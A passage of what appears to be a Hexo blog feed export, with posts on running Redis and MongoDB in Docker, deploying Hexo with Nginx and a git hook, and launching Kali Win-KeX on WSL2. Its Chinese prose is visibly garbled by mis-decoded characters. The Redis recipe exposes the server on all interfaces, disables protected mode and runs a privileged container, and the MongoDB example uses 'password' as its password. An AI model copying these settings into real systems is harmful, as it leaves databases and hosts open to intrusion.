<p>æœ‰ä¸ªå°è±¡(ï½ï¿£â–½ï¿£)ï½</p>
</blockquote>
<img data-src="http://img.owq.world/2021/11/2123-044c15.png" style="border-radius: 0px;" />



<hr>
<blockquote>
<p>æ—¥å¿—æ‡’äººåº“: <strong>loguru</strong> æ›´åŠ å¼ºå¤§æ›´ä¸ºæ˜“ç”¨ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RlbGdhbi9sb2d1cnU=">ğŸšª</span></p>
</blockquote>
]]></content>
      <categories>
        <category>æŠ€æœ¯è®°å½•</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>YAML</tag>
        <tag>log</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker+Redis å®‰è£…é…ç½®</title>
    <url>/8be682ad/</url>
    <content><![CDATA[<h2 id="ä¸‹è½½é•œåƒ"><a href="#ä¸‹è½½é•œåƒ" class="headerlink" title="ä¸‹è½½é•œåƒ"></a>ä¸‹è½½é•œåƒ</h2><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker pull redis</span></span><br></pre></td></tr></table></figure>

<h2 id="åˆ›å»ºæŒ‚è½½ç›®å½•"><a href="#åˆ›å»ºæŒ‚è½½ç›®å½•" class="headerlink" title="åˆ›å»ºæŒ‚è½½ç›®å½•"></a>åˆ›å»ºæŒ‚è½½ç›®å½•</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/data/</span>redis</span><br></pre></td></tr></table></figure>

<h2 id="ä¸‹è½½é…ç½®æ–‡ä»¶"><a href="#ä¸‹è½½é…ç½®æ–‡ä»¶" class="headerlink" title="ä¸‹è½½é…ç½®æ–‡ä»¶"></a>ä¸‹è½½é…ç½®æ–‡ä»¶</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>download.redis.io<span class="regexp">/redis-stable/</span>redis.conf &gt;&gt; <span class="regexp">/etc/</span>redis/redis.conf</span><br></pre></td></tr></table></figure>

<h2 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>redis/redis.conf</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®éœ€æ±‚ä¿®æ”¹é…ç½®æ–‡ä»¶</p>
<blockquote>
<p>å‚è€ƒèµ„æ–™ &gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80MWYzOTNmNTk0ZTg=">ğŸšª</span></p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç›‘å¬ç«¯å£</span></span><br><span class="line"><span class="attribute">bind</span> <span class="number">0.0.0.0</span></span><br><span class="line"></span><br><span class="line">port <span class="number">6379</span></span><br><span class="line">requirepass ****</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¯å¦å¼€å¯ä¿æŠ¤æ¨¡å¼ï¼Œé»˜è®¤å¼€å¯ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®bindé¡¹å’Œrediså¯†ç çš„è¯ï¼ŒæœåŠ¡å°†åªå…è®¸æœ¬åœ°è®¿é—®ã€‚</span></span><br><span class="line">protected-mode <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“ä¸ªæ•°</span></span><br><span class="line">databases <span class="number">16</span></span><br><span class="line"></span><br><span class="line">dir ./	<span class="comment"># è¾“å…¥æœ¬åœ°redisæ•°æ®åº“å­˜æ”¾æ–‡ä»¶å¤¹</span></span><br><span class="line"></span><br><span class="line">appendonly <span class="literal">yes</span> <span class="comment"># redisæŒä¹…åŒ–</span></span><br><span class="line"></span><br><span class="line">logfile <span class="string">&quot;redis.log&quot;</span> <span class="comment"># æ—¥å¿—æ–‡ä»¶å­˜æ”¾</span></span><br></pre></td></tr></table></figure>

<h2 id="è¿è¡Œå®¹å™¨"><a href="#è¿è¡Œå®¹å™¨" class="headerlink" title="è¿è¡Œå®¹å™¨"></a>è¿è¡Œå®¹å™¨</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line">-p 6379:6379 --name redis \</span><br><span class="line">-v /etc/redis/redis.conf:/etc/redis/redis.conf \	<span class="comment"># æŒ‚è½½é…ç½®æ–‡ä»¶</span></span><br><span class="line">-v /data/redis:/data:rw \	<span class="comment"># æŒ‚è½½æ•°æ®ç›®å½• rw ä¸ºè¯»å†™</span></span><br><span class="line">--privileged=<span class="literal">true</span> \	<span class="comment"># æå‡å®¹å™¨æƒé™ï¼ˆæ‹¥æœ‰çœŸæ­£çš„rootæƒé™ï¼‰</span></span><br><span class="line">-d redis redis-server /etc/redis/redis.conf	<span class="comment"># é…ç½®æ–‡ä»¶å¯åŠ¨æœåŠ¡</span></span><br></pre></td></tr></table></figure>

<h2 id="éªŒè¯å¯åŠ¨"><a href="#éªŒè¯å¯åŠ¨" class="headerlink" title="éªŒè¯å¯åŠ¨"></a>éªŒè¯å¯åŠ¨</h2><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure>

<h2 id="å¤±è´¥å¤„ç†"><a href="#å¤±è´¥å¤„ç†" class="headerlink" title="å¤±è´¥å¤„ç†"></a>å¤±è´¥å¤„ç†</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹é”™è¯¯æ—¥å¿—</span></span><br><span class="line">docker logs redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ redis æŒ‚è½½ç«¯å£æ˜ å°„ç­‰ä¿¡æ¯</span></span><br><span class="line">docker inspect redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ redis ç«¯å£æ˜ å°„</span></span><br><span class="line">docker port redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤é‡è¯•</span></span><br><span class="line">docker <span class="built_in">rm</span> redis</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>é…ç½®è®°å½•</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker+MongoDB å®‰è£…é…ç½®</title>
    <url>/d2633d2c/</url>
    <content><![CDATA[<h2 id="ä¸‹è½½é•œåƒ"><a href="#ä¸‹è½½é•œåƒ" class="headerlink" title="ä¸‹è½½é•œåƒ"></a>ä¸‹è½½é•œåƒ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mongo</span><br></pre></td></tr></table></figure>

<h2 id="åˆ›å»ºæŒ‚è½½ç›®å½•"><a href="#åˆ›å»ºæŒ‚è½½ç›®å½•" class="headerlink" title="åˆ›å»ºæŒ‚è½½ç›®å½•"></a>åˆ›å»ºæŒ‚è½½ç›®å½•</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /data/mongo</span><br></pre></td></tr></table></figure>

<h2 id="è¿è¡Œå®¹å™¨"><a href="#è¿è¡Œå®¹å™¨" class="headerlink" title="è¿è¡Œå®¹å™¨"></a>è¿è¡Œå®¹å™¨</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -p 27017:27017 -v /data/mongo:/data/db --name mongo -d mongo --auth</span><br></pre></td></tr></table></figure>

<h2 id="è¿›å…¥å®¹å™¨"><a href="#è¿›å…¥å®¹å™¨" class="headerlink" title="è¿›å…¥å®¹å™¨"></a>è¿›å…¥å®¹å™¨</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it mongo mongo admin</span><br></pre></td></tr></table></figure>

<h2 id="åˆ›å»ºç”¨æˆ·"><a href="#åˆ›å»ºç”¨æˆ·" class="headerlink" title="åˆ›å»ºç”¨æˆ·"></a>åˆ›å»ºç”¨æˆ·</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">db.createUser(</span><br><span class="line">  &#123;</span><br><span class="line">    user: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="built_in">pwd</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">    roles: [ &#123; role: <span class="string">&#x27;root&#x27;</span>, db: <span class="string">&#x27;admin&#x27;</span> &#125; ]	<span class="comment"># æŒ‡å®šæƒé™å’Œæ•°æ®åº“</span></span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">mongodb:</span>//admin:password<span class="subst">@127</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">27017</span></span><br></pre></td></tr></table></figure>

<h2 id="æ­£å¸¸å®‰è£…"><a href="#æ­£å¸¸å®‰è£…" class="headerlink" title="æ­£å¸¸å®‰è£…"></a>æ­£å¸¸å®‰è£…</h2><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubW9uZ29kYi5jb20vZG9jcy9tYW51YWwvaW5zdGFsbGF0aW9uLw==">Install MongoDB â€” MongoDB Manual</span></p>
</blockquote>
]]></content>
      <categories>
        <category>é…ç½®è®°å½•</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Mongo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo + Nginx æœåŠ¡å™¨éƒ¨ç½²è¸©å‘è®°å½•</title>
    <url>/e823826f/</url>
    <content><![CDATA[<blockquote>
<p>Hexo éƒ¨ç½²æ–¹å¼æœ‰å¾ˆå¤š, è¿™é‡Œé€‰æ‹©æ˜¯é»˜è®¤çš„ Git ä¸€é”®éƒ¨ç½²æ–¹å¼.<br>å‰ææ¡ä»¶: æ­å»ºå¥½çš„ Hexo æœ¬åœ°ç¯å¢ƒ, å…·æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨, å…·å¤‡sshçŸ¥è¯†.</p>
</blockquote>
<h2 id="ç›¸å…³èµ„æ–™"><a href="#ç›¸å…³èµ„æ–™" class="headerlink" title="ç›¸å…³èµ„æ–™"></a>ç›¸å…³èµ„æ–™</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL3poLWNuL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudA==">å®˜æ–¹æ–‡æ¡£</span> ï¼ˆç”¨å¤„è¾ƒå°ï¼‰</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvLWRlcGxveWVyLWdpdA==">éƒ¨ç½²æ’ä»¶</span> ï¼ˆè‡ªå®šä¹‰é…ç½®ä¼šç”¨åˆ°ï¼‰</li>
</ul>
<h2 id="æœåŠ¡å™¨ç¯å¢ƒå‡†å¤‡"><a href="#æœåŠ¡å™¨ç¯å¢ƒå‡†å¤‡" class="headerlink" title="æœåŠ¡å™¨ç¯å¢ƒå‡†å¤‡"></a>æœåŠ¡å™¨ç¯å¢ƒå‡†å¤‡</h2><h3 id="å®‰è£…-git-å’Œ-Nginx"><a href="#å®‰è£…-git-å’Œ-Nginx" class="headerlink" title="å®‰è£… git å’Œ Nginx"></a>å®‰è£… git å’Œ Nginx</h3><ul>
<li><p>git<br>ç”¨æ¥æ¥æ”¶ä½ çš„ç½‘ç«™æ–‡ä»¶æ¨é€çš„ï¼Œæ˜¯å®ç°ä¸€é”®éƒ¨ç½²çš„å…³é”®ã€‚</p>
</li>
<li><p>Nginx<br>ä¸€æ¬¾åå‘ä»£ç†ç½‘é¡µæœåŠ¡å™¨ï¼Œè®©ä½ çš„ç½‘ç«™å¾—ä»¥è¢«å¤–éƒ¨è®¿é—®çš„å…³é”®ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">apt install git nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># CentOS</span></span><br><span class="line">yum install -y git nginx</span><br></pre></td></tr></table></figure>



<h3 id="åˆ›å»ºä¸€ä¸ª-git-ç”¨æˆ·-å¯é€‰"><a href="#åˆ›å»ºä¸€ä¸ª-git-ç”¨æˆ·-å¯é€‰" class="headerlink" title="åˆ›å»ºä¸€ä¸ª git ç”¨æˆ·(å¯é€‰)"></a>åˆ›å»ºä¸€ä¸ª git ç”¨æˆ·(å¯é€‰)</h3><p>åˆ›å»ºä¸“é—¨ç”¨æ¥ç®¡ç†Gitä»“åº“çš„ç”¨æˆ·ï¼Œä¸»è¦æ˜¯ä¸ºäº†æƒé™ç®¡ç†ï¼Œå¯å‚è€ƒ<span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL2VuL3YyL0dpdC1vbi10aGUtU2VydmVyLVNldHRpbmctVXAtdGhlLVNlcnZlcg==">å®˜æ–¹æ–‡æ¡£</span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure>

<h3 id="å¯ç”¨git-shell-å¯é€‰"><a href="#å¯ç”¨git-shell-å¯é€‰" class="headerlink" title="å¯ç”¨git shell(å¯é€‰)"></a>å¯ç”¨<code>git shell</code>(å¯é€‰)</h3><p>æŸ¥çœ‹git-shellæ˜¯å¦å­˜åœ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shells</span><br></pre></td></tr></table></figure>

<p>ä¸å­˜åœ¨åˆ™æ·»åŠ </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹git-shellè·¯å¾„ é»˜è®¤ï¼š/usr/bin/git-shell</span></span><br><span class="line"><span class="built_in">which</span> git-shell</span><br><span class="line"><span class="comment"># æŠŠè·¯å¾„æ·»åŠ åˆ°shellsæ–‡ä»¶é‡Œ</span></span><br><span class="line">sudo vim /etc/shells</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹gitç”¨æˆ·é»˜è®¤shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chsh git -s $(<span class="built_in">which</span> git-shell)</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•sshè¿æ¥ï¼Œç™»å½•ä¸æˆåŠŸå³é…ç½®ok</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">git@<span class="keyword">&lt;IPåœ°å€&gt;</span></span></span><br></pre></td></tr></table></figure>



<h3 id="é…ç½®sshå…¬é’¥"><a href="#é…ç½®sshå…¬é’¥" class="headerlink" title="é…ç½®sshå…¬é’¥"></a>é…ç½®sshå…¬é’¥</h3><p>ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»º <code>.ssh</code> æ–‡ä»¶å¤¹å¹¶è®¾ç½®æƒé™ä¸º 700</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨gitç”¨æˆ·éœ€è¦è¿›è¡Œåˆ‡æ¢</span></span><br><span class="line">su git</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> ~/.ssh &amp;&amp; <span class="built_in">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure>

<p>åˆ›å»º <code>authorized_keys </code> æ–‡ä»¶, å°†æœ¬æœºå…¬é’¥å¤åˆ¶åˆ°é‡Œé¢.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>



<h3 id="åˆ›å»ºç›¸å…³ç›®å½•"><a href="#åˆ›å»ºç›¸å…³ç›®å½•" class="headerlink" title="åˆ›å»ºç›¸å…³ç›®å½•"></a>åˆ›å»ºç›¸å…³ç›®å½•</h3><p>åˆ›å»ºå­˜æ”¾Blogçš„gitä»“åº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/repo &amp;&amp; <span class="built_in">cd</span> /var/repo</span><br><span class="line">git init --bare blog.git</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºå­˜æ”¾ç½‘ç«™é™æ€æ–‡ä»¶çš„ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/www/hexo</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®ç›®å½•æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> -R git:git /var/www/hexo</span><br><span class="line"><span class="built_in">chmod</span> -R 755 /var/www/hexo</span><br></pre></td></tr></table></figure>

<p><em>PS:ä»“åº“å<code>blog.git</code>ã€é™æ€æ–‡ä»¶ç›®å½•<code>hoxo</code>å¯è‡ªå®šä¹‰</em></p>
<h3 id="æ·»åŠ post-receiveé’©å­"><a href="#æ·»åŠ post-receiveé’©å­" class="headerlink" title="æ·»åŠ post-receiveé’©å­"></a>æ·»åŠ <code>post-receive</code>é’©å­</h3><blockquote>
<p>å®˜æ–¹å‚è€ƒæ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL3poL3YyLyVFOCU4NyVBQSVFNSVBRSU5QSVFNCVCOSU4OS1HaXQtR2l0LSVFOSU5MiVBOSVFNSVBRCU5MA==">ğŸšª</span></p>
</blockquote>
<p>åœ¨ä»“åº“ä¸‹çš„ <code>hooks</code> ç›®å½•åˆ›å»º <code>post-receive</code> æ–‡ä»¶</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/var/</span>repo<span class="regexp">/blog.git/</span>hooks/post-receive</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ ä»¥ä¸‹å†…å®¹, è¿™ä¸ªé’©å­ä¼šåœ¨ä½ æœ¬åœ°æ›´æ–°æ¨é€åˆ°æœåŠ¡å™¨å®Œæˆåæ‰§è¡Œ, æ›´æ–°ä½ çš„ç½‘ç«™å†…å®¹ã€‚</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">git --work-tree=/var/www/hexo --git-dir=/var/repo/blog.git checkout -f</span><br></pre></td></tr></table></figure>

<p>é…ç½®æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/repo/blog.git/hooks/</span><br><span class="line"><span class="built_in">chown</span> -R git:git /var/repo/</span><br><span class="line"><span class="built_in">chown</span> -R git:git /var/www/hexo</span><br><span class="line"><span class="built_in">chmod</span> +x post-receive</span><br></pre></td></tr></table></figure>



<h3 id="æ£€æµ‹ä»“åº“æ˜¯å¦é…ç½®æˆåŠŸ"><a href="#æ£€æµ‹ä»“åº“æ˜¯å¦é…ç½®æˆåŠŸ" class="headerlink" title="æ£€æµ‹ä»“åº“æ˜¯å¦é…ç½®æˆåŠŸ"></a>æ£€æµ‹ä»“åº“æ˜¯å¦é…ç½®æˆåŠŸ</h3><p>èƒ½æˆåŠŸå…‹éš†åˆ™ä»£è¡¨é…ç½®æ­£ç¡®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> &lt;ä½¿ç”¨çš„ç”¨æˆ·å&gt;@&lt;ä½ çš„æœåŠ¡å™¨IP&gt;:/var/repo/blog.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¾‹å­</span></span><br><span class="line">git <span class="built_in">clone</span> git@8.8.8.8:/var/repo/blog.git</span><br></pre></td></tr></table></figure>



<h3 id="é…ç½®Nginx"><a href="#é…ç½®Nginx" class="headerlink" title="é…ç½®Nginx"></a>é…ç½®Nginx</h3><p>è¿™é‡Œä¿®æ”¹ä¸‹Nginxçš„é»˜è®¤ç«™ç‚¹é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx/</span><br><span class="line">vim sites-enabled/default</span><br></pre></td></tr></table></figure>

<p>é‡Œé¢é•¿è¿™æ · â†“<br><img data-src="http://img.owq.world/2021/11/2122-11343b.png"  /></p>
<p>è¿™é‡Œä¿®æ”¹rootç½‘ç«™æ ¹ç›®å½•å°±è¡Œäº†ï¼Œå…¶å®ƒå¯ä»¥ä¿æŒä¸åŠ¨</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">root /var/www/hexo;</span><br></pre></td></tr></table></figure>

<h3 id="å¯é€‰é…ç½®"><a href="#å¯é€‰é…ç½®" class="headerlink" title="å¯é€‰é…ç½®"></a>å¯é€‰é…ç½®</h3><p><code>server_name _;</code> ä¸€è¡Œè¡¨ç¤ºå…¨åŒ¹é…ï¼Œåªè¦è®¿é—®æœåŠ¡å™¨ï¼Œéƒ½ä¼šç›´æ¥è½¬å‘åˆ°å½“å‰<code>server</code>ä¸‹ï¼Œæœ‰åŸŸååå¯ä»¥è®¾ç½®ä¸ºåŸŸåï¼Œç„¶åé…ç½®<code>ä¸å…è®¸ipè®¿é—®</code>ï¼Œè¿™æ ·å¯ä»¥é¿å…å…¶ä»–äººæŠŠæœªå¤‡æ¡ˆçš„åŸŸåè§£æåˆ°è‡ªå·±çš„æœåŠ¡å™¨ IPï¼Œè€Œå¯¼è‡´æœåŠ¡å™¨è¢«æ–­ç½‘ã€‚(å¦‚æœä½ æ²¡å¤‡æ¡ˆå°±è§£æåŸŸåäº†ï¼Œé‚£ç°åœ¨å°±è¯¥çŸ¥é“æœåŠ¡å™¨ç™»ä¸äº†çš„åŸå› äº†ğŸ¤£)</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ³¨æ„ï¼šä»¥ä¸‹å†…å®¹å¯ä»¥åœ¨defaultæ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œä¸è¿‡æ¨èå…ˆäº†è§£Nginxç„¶åå†é…ç½®ä¸ºå¦™ã€‚</span></span><br><span class="line"></span><br><span class="line">http <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// æ–°å¢serverï¼Œè®¾ç½®ä¸å…è®¸Ipè®¿é—®web(default_server)</span></span><br><span class="line">    server <span class="punctuation">&#123;</span></span><br><span class="line">        listen <span class="number">80</span> default_server;</span><br><span class="line">        server_name _;</span><br><span class="line">        return <span class="number">403</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŸæœ‰defaultï¼Œè®¾ç½®www.you.comåŸŸåè®¿é—®web</span></span><br><span class="line">    server <span class="punctuation">&#123;</span></span><br><span class="line">        listen <span class="number">80</span>;</span><br><span class="line">        server_name www.you.com;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–°å¢serverï¼Œè®¾ç½®é¡¶çº§åŸŸåyou.comé‡å®šå‘</span></span><br><span class="line">    server <span class="punctuation">&#123;</span></span><br><span class="line">       listen <span class="number">80</span>;</span><br><span class="line">       server_name you.com;</span><br><span class="line">       return <span class="number">301</span> http<span class="punctuation">:</span><span class="comment">//www.you.com$request_uri;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>æ£€æŸ¥é…ç½®ç„¶åé‡è½½<code>Nginx</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t	<span class="comment"># æ£€æŸ¥é…ç½®</span></span><br><span class="line">nginx -s reload	<span class="comment"># é‡è½½é…ç½®</span></span><br></pre></td></tr></table></figure>



<h2 id="æœ¬åœ°éƒ¨ç½²é…ç½®"><a href="#æœ¬åœ°éƒ¨ç½²é…ç½®" class="headerlink" title="æœ¬åœ°éƒ¨ç½²é…ç½®"></a>æœ¬åœ°éƒ¨ç½²é…ç½®</h2><blockquote>
<p>éƒ¨ç½²æ’ä»¶é¡¹ç›® -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvLWRlcGxveWVyLWdpdA==">ğŸšª</span></p>
</blockquote>
<p><strong>ä¿®æ”¹ç«™ç‚¹ç›®å½•ä¸‹<code>_config.yml</code>æ–‡ä»¶</strong></p>
<h3 id="å•ä¸ªå­˜å‚¨éƒ¨ç½²é…ç½®"><a href="#å•ä¸ªå­˜å‚¨éƒ¨ç½²é…ç½®" class="headerlink" title="å•ä¸ªå­˜å‚¨éƒ¨ç½²é…ç½®"></a>å•ä¸ªå­˜å‚¨éƒ¨ç½²é…ç½®</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repo:</span> git@x.x.x.x:<span class="keyword">/var/</span>repo/blog.git</span><br></pre></td></tr></table></figure>

<h3 id="å¤šä¸ªå­˜å‚¨åº“éƒ¨ç½²é…ç½®ï¼ˆå¯é€‰ï¼‰"><a href="#å¤šä¸ªå­˜å‚¨åº“éƒ¨ç½²é…ç½®ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="å¤šä¸ªå­˜å‚¨åº“éƒ¨ç½²é…ç½®ï¼ˆå¯é€‰ï¼‰"></a>å¤šä¸ªå­˜å‚¨åº“éƒ¨ç½²é…ç½®ï¼ˆå¯é€‰ï¼‰</h3><p>è¿™é‡ŒåŒæ—¶å¯¹githubå’ŒæœåŠ¡å™¨è¿›è¡ŒåŒæ­¥ï¼Œå¯ä»¥ç”¨æ¥åº”ä»˜ä¸€äº›ç‰¹æ®Šæƒ…å†µï¼Œæ¯”å¦‚ï¼šæœåŠ¡å™¨æŒ‚äº†ã€å°äº†ä»€ä¹ˆçš„ã€‚</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repo:</span></span><br><span class="line"><span class="symbol">    server:</span> <span class="meta"># åç§°å¯è‡ªå®šä¹‰</span></span><br><span class="line"><span class="symbol">      url:</span> git@x.x.x.x:<span class="keyword">/var/</span>repo/blog.git</span><br><span class="line"><span class="symbol">      branch:</span> master</span><br><span class="line"><span class="symbol">    git:</span></span><br><span class="line"><span class="symbol">      url:</span> git@github.com:owq/owq.github.io.git</span><br><span class="line"><span class="symbol">      branch:</span> main</span><br></pre></td></tr></table></figure>



<h2 id="éƒ¨ç½²åˆ°æœåŠ¡å™¨"><a href="#éƒ¨ç½²åˆ°æœåŠ¡å™¨" class="headerlink" title="éƒ¨ç½²åˆ°æœåŠ¡å™¨"></a>éƒ¨ç½²åˆ°æœåŠ¡å™¨</h2><p>æœ¬åœ°æ“ä½œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ¸…é™¤ç¼“å­˜</span></span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€é”®éƒ¨ç½²</span></span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æµè§ˆå™¨è¾“å…¥æœåŠ¡å™¨IP,èƒ½æ­£å¸¸è®¿é—®å°±æˆåŠŸäº†</p>
</blockquote>
]]></content>
      <categories>
        <category>æŠ€æœ¯è®°å½•</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Nginx</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¼˜é›…çš„ä½¿ç”¨WSL2-Kaliæ¡Œé¢ç¯å¢ƒ</title>
    <url>/202281bd/</url>
    <content><![CDATA[<blockquote>
<p>Win-KeXå®˜æ–¹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy93c2wvd2luLWtleC8=">ğŸšª</span></p>
</blockquote>
<h2 id="å®‰è£…win-kex"><a href="#å®‰è£…win-kex" class="headerlink" title="å®‰è£…win-kex"></a>å®‰è£…win-kex</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install kali-win-kex</span><br></pre></td></tr></table></figure>

<h2 id="å¯åŠ¨Win-Kex"><a href="#å¯åŠ¨Win-Kex" class="headerlink" title="å¯åŠ¨Win-Kex"></a>å¯åŠ¨Win-Kex</h2><blockquote>
<p>Win-KeX æœ‰ä¸‰ç§å¯åŠ¨æ¨¡å¼</p>
</blockquote>
<ul>
<li><p>çª—å£æ¨¡å¼<br>åœ¨ä¸“ç”¨çª—å£ä¸­å¯åŠ¨ Kali Linux æ¡Œé¢.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kex --win -s	</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿œç¨‹è¿æ¥ï¼ˆæ¨èï¼‰<br>å¾®è½¯è‡ªå¸¦çš„è¿œç¨‹æ¡Œé¢å·¥å…·ï¼Œç”¨è¿‡çš„éƒ½è¯´å¥½~</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kex --esm --ip -s</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ— ç¼æ¨¡å¼<br>åœ¨ Windows å’Œ Kali åº”ç”¨ç¨‹åºå’Œèœå•ä¹‹é—´å…±äº« Windows æ¡Œé¢.</p>
